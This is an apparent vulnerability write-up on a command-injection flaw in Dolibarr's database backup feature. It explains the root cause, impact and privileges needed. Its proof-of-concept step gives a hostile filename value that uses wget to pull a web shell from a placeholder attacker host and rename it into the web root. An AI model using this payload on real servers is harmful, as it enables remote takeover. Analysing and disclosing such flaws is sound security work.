Based on the provided content, here's a breakdown of the vulnerability:

**Root Cause:**
The vulnerability lies in the insufficient sanitization of the `filename_template` parameter used within the database backup functionality of Dolibarr. Specifically, the `dol_sanitizePathName` function, intended to prevent command injection, can be bypassed using backticks (``).

**Weaknesses/Vulnerabilities:**
- **Command Injection:** The primary vulnerability is a command injection flaw. User-controlled input (`filename_template`) is incorporated into a command string that is later executed by the system, allowing the injection of arbitrary commands.
- **Insufficient Sanitization:** The `dol_sanitizePathName` function fails to properly sanitize backticks, which can be used to execute commands in a shell context.

**Impact of Exploitation:**
- **Remote Code Execution (RCE):** Successful exploitation allows an attacker to execute arbitrary commands on the hosting server.
- **Complete System Compromise:**  The attacker can potentially gain full control of the affected system.

**Attack Vectors:**
- The attack vector is through the web interface of Dolibarr, specifically the "Admin Tools > Backup" feature.
- The vulnerable parameter is the "Filename for backup" field.

**Required Attacker Capabilities/Position:**
- **Authentication:** The attacker must be an authenticated user with administrative privileges.
- **Network Access:**  The attacker needs network access to the Dolibarr instance.

**Technical Details:**
The vulnerability occurs within the `dumpDatabase` function located in `htdocs/core/class.utils.class.php`. The provided filename is passed through the `dol_sanitizeFileName` and `dol_sanitizePathName` functions. However, the `dol_sanitizePathName` function (in `core/lib/functions.lib.php`) does not filter backticks (``) which allows an attacker to use them to inject arbitrary shell commands into the command string executed with `exec()`.

**Proof of Concept:**
The provided Proof of Concept (PoC) uses `wget` to download a webshell and then renames it, creating a backdoor on the server:
1.  A web shell is created named `index.html`.
2.  `index.html` is hosted on an attacker controlled webserver.
3.  In Dolibarr, the `mysqldump` export method and low memory mode is selected.
4.  The filename is set to  `wget <attacker_ip>/index.html && mv index.html shell.php`.
5. The webshell will be downloaded to `/htdocs/admin/tools/shell.php`.
